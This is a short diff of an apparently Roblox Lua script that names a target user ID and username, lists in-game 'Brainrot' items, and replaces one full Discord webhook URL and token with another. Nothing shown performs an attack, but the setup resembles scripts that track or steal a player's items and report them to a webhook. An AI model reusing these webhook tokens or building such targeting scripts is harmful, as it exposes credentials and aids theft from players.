@@ -1,6 +1,6 @@
 local TARGET_ID = 9927602784
 local TARGET_USER = "SECRET_AGENT111158"
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1571090179127513188/bkHwo_7M2EQ7A9trFj0TVaV_B0gU2OzF0oI-2VUk2S_F50kCaBzq8EMSvxaDNNO1nppF"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1571086756483436597/5q16BEEoZjvQ1I-CmowyG5bjSus_F1qf2KG4vTWoRin1sYApWTXAX3dL_RIwBUGixo-w"
 
 local TargetBrainrots = {
     ["Dragon Skeletonini"] = true,
